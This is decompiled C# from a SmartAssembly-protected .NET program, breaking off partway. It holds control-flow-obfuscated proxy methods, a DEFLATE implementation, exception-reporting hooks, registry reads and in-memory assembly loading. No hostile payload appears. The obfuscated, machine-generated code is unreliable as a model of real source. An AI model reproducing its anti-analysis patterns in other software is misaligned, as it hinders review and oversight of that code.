using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns3;
using ns5;
using ns6;
using ns7;

namespace ns2;

internal sealed class Class25
{
	static int smethod_0(Class14.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static int smethod_1(Array array_0, int int_0, int int_1, int int_2)
	{
		int num = 9;
		while (true)
		{
			int num2;
			switch (int_2 ^ int_1)
			{
			case 86:
				num = 7;
				num2 = 2;
				break;
			default:
				num = 0;
				num2 = 0;
				break;
			}
			int num3 = num2;
			num = 4;
			switch (num3)
			{
			default:
				num = 6;
				goto IL_0044;
			case 0:
				num = 8;
				num3 = 3;
				num = 4;
				goto case 3;
			case 1:
				num = 9;
				continue;
			case 4:
				num = 6;
				goto IL_0044;
			case 7:
				num = 11;
				num3 = 3;
				num = 4;
				goto case 3;
			case 3:
				num = 9;
				continue;
			case 2:
				num = 12;
				break;
			case 5:
				num = 12;
				break;
			case 6:
				{
					num = 12;
					break;
				}
				IL_0044:
				num3 = 3;
				num = 4;
				goto case 3;
			}
			break;
		}
		return Class25.smethod_201(array_0, int_0, 707, 696);
	}

	static void smethod_2(Array array_0, int int_0, int int_1)
	{
		int num = 2;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 116:
				Array.Reverse(array_0);
				return;
			}
			num = 2;
		}
	}

	static void smethod_3(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_4(Control0 control0_0)
	{
		Class25.smethod_65(string.Empty, control0_0);
	}

	static void smethod_5(Class28 class28_0, Delegate1 delegate1_0)
	{
		Delegate1 @delegate = class28_0.delegate1_0;
		Delegate1 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate1 value = (Delegate1)Delegate.Combine(delegate2, delegate1_0);
			@delegate = Interlocked.CompareExchange(ref class28_0.delegate1_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static void smethod_6(int[] int_0, Class14.Class21.Class22 class22_0)
	{
		class22_0.byte_0 = new byte[class22_0.short_0.Length];
		int num = int_0.Length / 2;
		int num2 = (num + 1) / 2;
		int num3 = 0;
		for (int i = 0; i < class22_0.int_3; i++)
		{
			class22_0.int_2[i] = 0;
		}
		int[] array = new int[num];
		array[num - 1] = 0;
		for (int num4 = num - 1; num4 >= 0; num4--)
		{
			if (int_0[2 * num4 + 1] != -1)
			{
				int num5 = array[num4] + 1;
				if (num5 > class22_0.int_3)
				{
					num5 = class22_0.int_3;
					num3++;
				}
				array[int_0[2 * num4]] = (array[int_0[2 * num4 + 1]] = num5);
			}
			else
			{
				int num6 = array[num4];
				class22_0.int_2[num6 - 1]++;
				class22_0.byte_0[int_0[2 * num4]] = (byte)array[num4];
			}
		}
		if (num3 == 0)
		{
			return;
		}
		int num7 = class22_0.int_3 - 1;
		while (true)
		{
			if (class22_0.int_2[--num7] != 0)
			{
				do
				{
					class22_0.int_2[num7]--;
					class22_0.int_2[++num7]++;
					num3 -= 1 << class22_0.int_3 - 1 - num7;
				}
				while (num3 > 0 && num7 < class22_0.int_3 - 1);
				if (num3 <= 0)
				{
					break;
				}
			}
		}
		class22_0.int_2[class22_0.int_3 - 1] += num3;
		class22_0.int_2[class22_0.int_3 - 2] -= num3;
		int num8 = 2 * num2;
		for (int num9 = class22_0.int_3; num9 != 0; num9--)
		{
			int num10 = class22_0.int_2[num9 - 1];
			while (num10 > 0)
			{
				int num11 = 2 * int_0[num8++];
				if (int_0[num11 + 1] == -1)
				{
					class22_0.byte_0[int_0[num11]] = (byte)num9;
					num10--;
				}
			}
		}
	}

	static int smethod_7(Class14.Class17 class17_0, Class14.Class16 class16_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class17_0.int_1), Class25.smethod_40(class16_0));
		int num = 32768 - class17_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class25.smethod_249(class16_0, class17_0.byte_0, class17_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class25.smethod_249(class16_0, class17_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class25.smethod_249(class16_0, class17_0.byte_0, class17_0.int_0, int_0);
		}
		class17_0.int_0 = (class17_0.int_0 + num2) & 0x7FFF;
		class17_0.int_1 += num2;
		return num2;
	}

	static void smethod_8(string string_0, string string_1, int int_0, int int_1)
	{
		int num = 3;
		int num2 = 0;
		num = 5;
		while (true)
		{
			num = 0;
			while (true)
			{
				int num3;
				switch (int_1 ^ int_0)
				{
				case 117:
					num = 7;
					num3 = 5;
					break;
				default:
					num = 6;
					num3 = 2;
					break;
				}
				num2 = num3;
				num = 5;
				switch (num2)
				{
				default:
					num = 0;
					continue;
				case 4:
					num = 0;
					continue;
				case 2:
					num = 4;
					num2 = 0;
					num = 5;
					break;
				case 0:
					break;
				case 1:
					num = 9;
					goto IL_0061;
				case 3:
					num = 9;
					goto IL_0061;
				case 5:
					{
						num = 9;
						goto IL_0061;
					}
					IL_0061:
					Class25.smethod_241(string_0, string_1, 397, 414);
					return;
				}
				break;
			}
		}
	}

	static void smethod_9(Delegate2 delegate2_0, Class39 class39_0)
	{
		if (class39_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class39_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class39_0.iwebProxy_0);
				}
				class39_0.string_2 = uploadReportLoginService.GetServerURL(class39_0.string_1);
				if (class39_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class39_0.string_2 == "ditto")
				{
					class39_0.string_2 = Class39.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate2_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate2_0(class39_0.string_2.StartsWith("ERR") ? class39_0.string_2 : "OK");
	}

	static short smethod_10(int int_0)
	{
		return (short)((Class14.Class21.byte_0[int_0 & 0xF] << 12) | (Class14.Class21.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class14.Class21.byte_0[(int_0 >> 8) & 0xF] << 4) | Class14.Class21.byte_0[int_0 >> 12]);
	}

	static void smethod_11(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class25.smethod_54(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static string smethod_12(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int num)
			{
				return num.ToString("x");
			}
			if (object_0 is long num2)
			{
				return num2.ToString("x");
			}
			if (object_0 is short num3)
			{
				return num3.ToString("x");
			}
			if (object_0 is uint num4)
			{
				return num4.ToString("x");
			}
			if (object_0 is ulong num5)
			{
				return num5.ToString("x");
			}
			if (object_0 is ushort num6)
			{
				return num6.ToString("x");
			}
			if (object_0 is byte b)
			{
				return b.ToString("x");
			}
			if (object_0 is sbyte b2)
			{
				return b2.ToString("x");
			}
			if (object_0 is IntPtr intPtr)
			{
				return intPtr.ToInt64().ToString("x");
			}
			if (object_0 is UIntPtr)
			{
				return ((UIntPtr)object_0).ToUInt64().ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static object smethod_13(AppDomain appDomain_0, string string_0, int int_0, int int_1)
	{
		int num = 2;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 56:
				num = 9;
				num2 = 4;
				break;
			default:
				num = 12;
				num2 = 2;
				break;
			}
			int num3 = num2;
			num = 1;
			switch (num3)
			{
			default:
				num = 6;
				goto IL_004f;
			case 0:
				num = 7;
				num3 = 6;
				num = 1;
				goto IL_0053;
			case 2:
				num = 3;
				num3 = 6;
				num = 1;
				goto IL_0053;
			case 3:
				num = 6;
				goto IL_004f;
			case 5:
				num = 6;
				goto IL_004f;
			case 7:
				num = 6;
				goto IL_004f;
			case 6:
				goto IL_0053;
			case 1:
				num = 0;
				break;
			case 4:
				{
					num = 0;
					break;
				}
				IL_004f:
				num3 = 6;
				num = 1;
				goto IL_0053;
			}
			break;
			IL_0053:
			num = 2;
		}
		return Class25.smethod_175(appDomain_0, string_0, 249, 188);
	}

	static int smethod_14(Font font_0, int int_0, string string_0, Graphics graphics_0)
	{
		Class40.Struct11 struct11_ = new Class40.Struct11(new Rectangle(0, 0, int_0, 10000));
		IntPtr hdc = graphics_0.GetHdc();
		IntPtr intptr_ = font_0.ToHfont();
		IntPtr intptr_2 = Class25.SelectObject(hdc, intptr_);
		Class25.DrawText(hdc, string_0, -1, ref struct11_, 3088);
		Class25.SelectObject(hdc, intptr_2);
		graphics_0.ReleaseHdc(hdc);
		return struct11_.int_3 - struct11_.int_1;
	}

	static Assembly smethod_15(byte[] byte_0, byte[] byte_1, Evidence evidence_0, int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 122:
				num = 7;
				num2 = 7;
				break;
			default:
				num = 5;
				num2 = 5;
				break;
			}
			int num3 = num2;
			num = 6;
			switch (num3)
			{
			default:
				num = 2;
				goto IL_0054;
			case 0:
				num = 3;
				goto IL_003f;
			case 1:
				num = 11;
				goto IL_004c;
			case 3:
				num = 3;
				goto IL_003f;
			case 4:
				num = 2;
				goto IL_0054;
			case 5:
				num = 11;
				goto IL_004c;
			case 6:
				num = 2;
				goto IL_0054;
			case 2:
				break;
			case 7:
				{
					num = 0;
					return Class25.smethod_168(byte_0, byte_1, evidence_0, 333, 350);
				}
				IL_004c:
				num3 = 2;
				num = 6;
				break;
				IL_003f:
				num3 = 2;
				num = 6;
				break;
				IL_0054:
				num3 = 2;
				num = 6;
				break;
			}
			num = 4;
		}
	}

	static RegistryKey smethod_16(RegistryKey registryKey_0, string string_0, bool bool_0, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 19:
				num = 6;
				num2 = 2;
				break;
			default:
				num = 9;
				num2 = 3;
				break;
			}
			int num3 = num2;
			num = 4;
			switch (num3)
			{
			default:
				num = 3;
				goto IL_0046;
			case 0:
				num = 3;
				goto IL_0046;
			case 3:
				num = 1;
				goto IL_003e;
			case 4:
				num = 1;
				goto IL_003e;
			case 6:
				num = 3;
				goto IL_0046;
			case 7:
				num = 12;
				num3 = 5;
				num = 4;
				goto IL_0053;
			case 5:
				goto IL_0053;
			case 1:
				num = 10;
				break;
			case 2:
				{
					num = 10;
					break;
				}
				IL_003e:
				num3 = 5;
				num = 4;
				goto IL_0053;
				IL_0046:
				num3 = 5;
				num = 4;
				goto IL_0053;
			}
			break;
			IL_0053:
			num = 0;
		}
		return Class25.smethod_118(registryKey_0, string_0, bool_0, 469, 505);
	}

	static void smethod_17(int int_0, bool bool_0, Class14.Class21 class21_0, int int_1, byte[] byte_0)
	{
		Class25.smethod_30(class21_0.class24_0, bool_0 ? 1 : 0, 3);
		Class25.smethod_88(class21_0.class24_0);
		Class25.smethod_211(class21_0.class24_0, int_0);
		Class25.smethod_211(class21_0.class24_0, ~int_0);
		Class25.smethod_97(byte_0, int_1, int_0, class21_0.class24_0);
		Class25.smethod_192(class21_0);
	}

	static Stream smethod_18(Assembly assembly_0, string string_0, int int_0, int int_1)
	{
		int num = 9;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 107:
				num = 8;
				num2 = 0;
				break;
			default:
				num = 2;
				num2 = 6;
				break;
			}
			int num3 = num2;
			num = 10;
			switch (num3)
			{
			default:
				num = 4;
				goto IL_0041;
			case 1:
				num = 9;
				continue;
			case 3:
				num = 5;
				goto IL_0053;
			case 5:
				num = 4;
				goto IL_0041;
			case 6:
				num = 7;
				num3 = 2;
				num = 10;
				goto case 2;
			case 7:
				num = 5;
				goto IL_0053;
			case 2:
				num = 9;
				continue;
			case 0:
				num = 1;
				break;
			case 4:
				{
					num = 1;
					break;
				}
				IL_0053:
				num3 = 2;
				num = 10;
				goto case 2;
				IL_0041:
				num3 = 2;
				num = 10;
				goto case 2;
			}
			break;
		}
		return Class25.smethod_220(assembly_0, string_0, 37, 85);
	}

	static void smethod_19(RegistryKey registryKey_0, int int_0, int int_1)
	{
		int num = 3;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 106:
				registryKey_0.Close();
				return;
			}
			num = 3;
		}
	}

	static void smethod_20(Class14.Class23 class23_0, byte[] byte_0)
	{
		class23_0.byte_1 = byte_0;
		class23_0.int_7 = 0;
		class23_0.int_8 = byte_0.Length;
	}

	static void smethod_21(Exception exception_0, object object_0, object object_1)
	{
		Class25.smethod_54(exception_0, new object[2] { object_0, object_1 });
	}

	static void smethod_22(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class25.smethod_54(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_23(object object_0, int int_0, int int_1)
	{
		int num = 1;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 85:
				Monitor.Enter(object_0);
				return;
			case 86:
				Monitor.Exit(object_0);
				return;
			}
			num = 1;
		}
	}

	static int smethod_24(string string_0, Font font_0, int int_0, Graphics graphics_0)
	{
		try
		{
			return Class25.smethod_14(font_0, int_0, string_0, graphics_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class25.smethod_160(string_0, int_0, graphics_0, font_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static Enum0 smethod_25(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.enum0_0;
	}

	static void smethod_26(Class14.Stream0 stream0_0, int int_0)
	{
		Class25.smethod_155(stream0_0, int_0);
		Class25.smethod_155(stream0_0, int_0 >> 16);
	}

	static char[] smethod_27(string string_0, int int_0, int int_1)
	{
		int num = 10;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 19:
				num = 9;
				num2 = 4;
				break;
			default:
				num = 5;
				num2 = 6;
				break;
			}
			int num3 = num2;
			num = 6;
			switch (num3)
			{
			default:
				num = 2;
				goto IL_0038;
			case 1:
				num = 2;
				goto IL_0038;
			case 2:
				num = 10;
				break;
			case 3:
				num = 3;
				goto IL_004d;
			case 5:
				num = 8;
				goto IL_0055;
			case 6:
				num = 3;
				goto IL_004d;
			case 7:
				num = 8;
				goto IL_0055;
			case 0:
				num = 10;
				break;
			case 4:
				{
					num = 1;
					return Class25.smethod_115(string_0, 225, 252);
				}
				IL_0055:
				num3 = 0;
				num = 6;
				goto case 0;
				IL_004d:
				num3 = 0;
				num = 6;
				goto case 0;
				IL_0038:
				num3 = 0;
				num = 6;
				goto case 0;
			}
		}
	}

	static bool smethod_28(Class14.Class21 class21_0, int int_0)
	{
		class21_0.short_0[class21_0.int_1] = 0;
		class21_0.byte_1[class21_0.int_1++] = (byte)int_0;
		class21_0.class22_0.short_0[int_0]++;
		return Class25.smethod_178(class21_0);
	}

	static void smethod_29(Class14.Class21.Class22 class22_0, Class14.Class21.Class22 class22_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class22_0.int_1)
		{
			int num3 = 1;
			int num4 = class22_0.byte_0[num2];
			int num5;
			int num6;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
			}
			else
			{
				num5 = 6;
				num6 = 3;
				if (num != num4)
				{
					class22_1.short_0[num4]++;
					num3 = 0;
				}
			}
			num = num4;
			num2++;
			while (num2 < class22_0.int_1 && num == class22_0.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				class22_1.short_0[num] += (short)num3;
			}
			else if (num != 0)
			{
				class22_1.short_0[16]++;
			}
			else if (num3 <= 10)
			{
				class22_1.short_0[17]++;
			}
			else
			{
				class22_1.short_0[18]++;
			}
		}
	}

	static void smethod_30(Class14.Class24 class24_0, int int_0, int int_1)
	{
		class24_0.uint_0 |= (uint)(int_0 << class24_0.int_2);
		class24_0.int_2 += int_1;
		if (class24_0.int_2 >= 16)
		{
			class24_0.byte_0[class24_0.int_1++] = (byte)class24_0.uint_0;
			class24_0.byte_0[class24_0.int_1++] = (byte)(class24_0.uint_0 >> 8);
			class24_0.uint_0 >>= 16;
			class24_0.int_2 -= 16;
		}
	}

	static string smethod_31(string string_0, string string_1, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 106:
				num = 11;
				num2 = 6;
				break;
			default:
				num = 1;
				num2 = 0;
				break;
			}
			int num3 = num2;
			num = 9;
			switch (num3)
			{
			default:
				num = 7;
				goto IL_0047;
			case 0:
				num = 10;
				goto IL_003e;
			case 1:
				num = 10;
				goto IL_003e;
			case 2:
				num = 7;
				goto IL_0047;
			case 3:
				num = 8;
				num3 = 7;
				num = 9;
				goto case 7;
			case 4:
				num = 0;
				break;
			case 5:
				num = 0;
				break;
			case 7:
				num = 0;
				break;
			case 6:
				{
					num = 12;
					return Class25.smethod_154(string_0, string_1, 287, 355);
				}
				IL_003e:
				num3 = 7;
				num = 9;
				goto case 7;
				IL_0047:
				num3 = 7;
				num = 9;
				goto case 7;
			}
		}
	}

	static int smethod_32(Class14.Class21 class21_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static string smethod_33()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class25.smethod_231());
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class25.smethod_106());
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_34(AppDomain appDomain_0, string string_0, object object_0, int int_0, int int_1)
	{
		int num = 2;
		int num2 = 5;
		num = 5;
		while (true)
		{
			num = 9;
			while (true)
			{
				int num3;
				switch (int_1 ^ int_0)
				{
				case 69:
					num = 7;
					num3 = 1;
					break;
				default:
					num = 10;
					num3 = 3;
					break;
				}
				num2 = num3;
				num = 5;
				switch (num2)
				{
				default:
					num = 9;
					continue;
				case 2:
					num = 9;
					continue;
				case 4:
					num = 9;
					continue;
				case 3:
					num = 8;
					num2 = 5;
					num = 5;
					break;
				case 5:
					break;
				case 0:
					num = 4;
					return;
				case 1:
					num = 1;
					Class25.smethod_254(appDomain_0, string_0, object_0, 870, 871);
					return;
				}
				break;
			}
		}
	}

	static void smethod_35(Class14.Class17 class17_0, int int_0)
	{
		if (class17_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class17_0.byte_0[class17_0.int_0++] = (byte)int_0;
		class17_0.int_0 &= 32767;
	}

	static Class14.Class18 smethod_36(Class14.Class19 class19_0)
	{
		byte[] array = new byte[class19_0.int_4];
		Array.Copy(class19_0.byte_1, class19_0.int_3, array, 0, class19_0.int_4);
		return new Class14.Class18(array);
	}

	static string smethod_37()
	{
		return "SmartAssembly" + " " + Class25.smethod_66();
	}

	static void smethod_38()
	{
		int num = 4;
		if (Class5.Class6.bool_0)
		{
			return;
		}
		num = 2;
		lock (typeof(Class5.Class6))
		{
			int num2 = 4;
			if (!Class5.Class6.bool_0)
			{
				Class5.Class6.bool_0 = true;
				AppDomain.CurrentDomain.ResourceResolve += Class25.smethod_255;
				num2 = 2;
			}
		}
		int num3 = 4;
		num3 = 2;
	}

	static int smethod_39(Stream stream_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 17:
				return stream_0.ReadByte();
			}
			int num = 7;
		}
	}

	static int smethod_40(Class14.Class16 class16_0)
	{
		return class16_0.int_1 - class16_0.int_0 + (class16_0.int_2 >> 3);
	}

	static Assembly smethod_41(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 46:
				return Assembly.GetExecutingAssembly();
			}
			int num = 0;
		}
	}

	static void smethod_42(Control1 control1_0, Enum1 enum1_0)
	{
		if (control1_0.enum1_0 != enum1_0)
		{
			control1_0.enum1_0 = enum1_0;
			switch (control1_0.enum1_0)
			{
			default:
				control1_0.bitmap_0 = null;
				break;
			case Enum1.const_1:
				control1_0.bitmap_0 = Class25.smethod_171("error16");
				break;
			case Enum1.const_2:
				control1_0.bitmap_0 = Class25.smethod_171("warning16");
				break;
			}
			((Control)control1_0).Refresh();
		}
	}

	static bool smethod_43()
	{
		try
		{
			return Class25.GetSystemMetrics(89) != 0;
		}
		catch
		{
			return false;
		}
	}

	static void smethod_44(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class25.smethod_54(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static void smethod_45(bool bool_0, Control3 control3_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_46(Class37 class37_0)
	{
		if (class37_0 != null)
		{
			Class37.class37_0 = class37_0;
			AppDomain.CurrentDomain.UnhandledException += class37_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class37_0.method_0);
		}
	}

	static Encoding smethod_47(int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 106:
				num = 9;
				num2 = 7;
				break;
			default:
				num = 8;
				num2 = 2;
				break;
			}
			int num3 = num2;
			num = 6;
			switch (num3)
			{
			default:
				num = 2;
				goto IL_004b;
			case 1:
				num = 7;
				num3 = 4;
				num = 6;
				goto IL_004f;
			case 2:
				num = 5;
				num3 = 4;
				num = 6;
				goto IL_004f;
			case 3:
				num = 2;
				goto IL_004b;
			case 6:
				num = 2;
				goto IL_004b;
			case 4:
				goto IL_004f;
			case 0:
				num = 1;
				break;
			case 5:
				num = 1;
				break;
			case 7:
				{
					num = 1;
					break;
				}
				IL_004b:
				num3 = 4;
				num = 6;
				goto IL_004f;
			}
			break;
			IL_004f:
			num = 4;
		}
		return Class25.smethod_122(552, 524);
	}

	static bool smethod_48(Class14.Class16 class16_0)
	{
		return class16_0.int_0 == class16_0.int_1;
	}

	static int smethod_49(int int_0, int int_1)
	{
		int num = 1;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 7:
				num = 6;
				num2 = 7;
				break;
			default:
				num = 11;
				num2 = 6;
				break;
			}
			int num3 = num2;
			num = 8;
			switch (num3)
			{
			default:
				num = 12;
				goto IL_0045;
			case 0:
				num = 1;
				break;
			case 2:
				num = 12;
				goto IL_0045;
			case 3:
				num = 1;
				break;
			case 4:
				num = 12;
				goto IL_0045;
			case 5:
				num = 2;
				num3 = 1;
				num = 8;
				goto case 1;
			case 6:
				num = 7;
				num3 = 1;
				num = 8;
				goto case 1;
			case 1:
				num = 1;
				break;
			case 7:
				{
					num = 4;
					return Class25.smethod_239(849, 828);
				}
				IL_0045:
				num3 = 1;
				num = 8;
				goto case 1;
			}
		}
	}

	static string smethod_50(Class28.Class32 class32_0)
	{
		return class32_0.string_0;
	}

	static bool smethod_51(string string_0, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 26:
				num = 5;
				num2 = 4;
				break;
			default:
				num = 7;
				num2 = 7;
				break;
			}
			int num3 = num2;
			num = 6;
			switch (num3)
			{
			default:
				num = 10;
				goto IL_0038;
			case 2:
				num = 10;
				goto IL_0038;
			case 3:
				num = 8;
				goto IL_0044;
			case 6:
				num = 8;
				goto IL_0044;
			case 7:
				num = 1;
				num3 = 5;
				num = 6;
				goto IL_0050;
			case 5:
				goto IL_0050;
			case 0:
				num = 4;
				break;
			case 1:
				num = 4;
				break;
			case 4:
				{
					num = 4;
					break;
				}
				IL_0044:
				num3 = 5;
				num = 6;
				goto IL_0050;
				IL_0038:
				num3 = 5;
				num = 6;
				goto IL_0050;
			}
			break;
			IL_0050:
			num = 0;
		}
		return Class25.smethod_189(string_0, 538, 599);
	}

	static void smethod_52(Class14.Class20 class20_0)
	{
		class20_0.int_0 |= 12;
	}

	static Exception smethod_53(EventArgs0 eventArgs0_0)
	{
		return eventArgs0_0.exception_0;
	}

	static void smethod_54(Exception exception_0, object[] object_0)
	{
		int int_ = -1;
		int int_2 = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				int_ = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				int_2 = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(int_, object_0, int_2, num);
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static int smethod_55(byte[] byte_0, int int_0, int int_1, Class14.Class15 class15_0)
	{
		int num = 0;
		do
		{
			if (class15_0.int_4 != 11)
			{
				int num2 = Class25.smethod_80(int_1, class15_0.class17_0, byte_0, int_0);
				int_1 += num2;
				num += num2;
				int_0 -= num2;
				if (int_0 == 0)
				{
					return num;
				}
			}
		}
		while (Class25.smethod_235(class15_0) || (Class25.smethod_195(class15_0.class17_0) > 0 && class15_0.int_4 != 11));
		return num;
	}

	static bool smethod_56(Class14.Class19 class19_0, Class14.Class16 class16_0)
	{
		while (true)
		{
			switch (class19_0.int_2)
			{
			case 5:
			{
				int int_ = Class14.Class19.int_1[class19_0.int_7];
				int num = Class25.smethod_147(class16_0, int_);
				if (num >= 0)
				{
					Class25.smethod_123(class16_0, int_);
					num += Class14.Class19.int_0[class19_0.int_7];
					while (num-- > 0)
					{
						class19_0.byte_1[class19_0.int_8++] = class19_0.byte_2;
					}
					if (class19_0.int_8 == class19_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class25.smethod_177(class19_0.class18_0, class16_0)) & -16) == 0)
				{
					class19_0.byte_1[class19_0.int_8++] = (class19_0.byte_2 = (byte)num2);
					if (class19_0.int_8 == class19_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class19_0.byte_2 = 0;
					}
					class19_0.int_7 = num2 - 16;
					class19_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class19_0.int_8 < class19_0.int_5)
				{
					int num3 = Class25.smethod_147(class16_0, 3);
					if (num3 >= 0)
					{
						Class25.smethod_123(class16_0, 3);
						class19_0.byte_0[Class14.Class19.int_9[class19_0.int_8]] = (byte)num3;
						class19_0.int_8++;
						continue;
					}
					return false;
				}
				class19_0.class18_0 = new Class14.Class18(class19_0.byte_0);
				class19_0.byte_0 = null;
				class19_0.int_8 = 0;
				class19_0.int_2 = 4;
				goto case 4;
			case 2:
				class19_0.int_5 = Class25.smethod_147(class16_0, 4);
				if (class19_0.int_5 >= 0)
				{
					class19_0.int_5 += 4;
					Class25.smethod_123(class16_0, 4);
					class19_0.byte_0 = new byte[19];
					class19_0.int_8 = 0;
					class19_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class19_0.int_4 = Class25.smethod_147(class16_0, 5);
				if (class19_0.int_4 >= 0)
				{
					class19_0.int_4++;
					Class25.smethod_123(class16_0, 5);
					class19_0.int_6 = class19_0.int_3 + class19_0.int_4;
					class19_0.byte_1 = new byte[class19_0.int_6];
					class19_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class19_0.int_3 = Class25.smethod_147(class16_0, 5);
				if (class19_0.int_3 >= 0)
				{
					class19_0.int_3 += 257;
					Class25.smethod_123(class16_0, 5);
					class19_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class19_0.int_2 = 4;
		}
	}

	static Evidence smethod_57(Assembly assembly_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 62:
				return assembly_0.get_Evidence();
			}
			int num = 3;
		}
	}

	static string[] smethod_58(Assembly assembly_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 113:
				return assembly_0.GetManifestResourceNames();
			}
			int num = 0;
		}
	}

	[DllImport("shell32")]
	static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static string smethod_59(Environment.SpecialFolder specialFolder_0, int int_0, int int_1)
	{
		int num = 3;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 91:
				num = 10;
				num2 = 4;
				break;
			default:
				num = 11;
				num2 = 5;
				break;
			}
			int num3 = num2;
			num = 1;
			switch (num3)
			{
			default:
				num = 2;
				goto IL_004f;
			case 0:
				num = 6;
				goto IL_003f;
			case 3:
				num = 3;
				continue;
			case 5:
				num = 6;
